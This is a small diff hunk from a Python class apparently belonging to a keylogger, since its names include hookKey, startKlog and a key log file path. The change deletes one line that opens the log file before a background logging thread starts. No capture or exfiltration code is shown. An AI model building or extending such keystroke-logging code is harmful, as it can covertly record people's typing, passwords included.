@@ -46,7 +46,6 @@ class KeyboardController():
     def hookKey(self):
         tkLog = threading.Thread(target=self.startKlog) 
         tkLog.daemon = True
-        open(KeyLog.FilLogPath, "w")
         tkLog.start()
     
     def unhookKey(self):
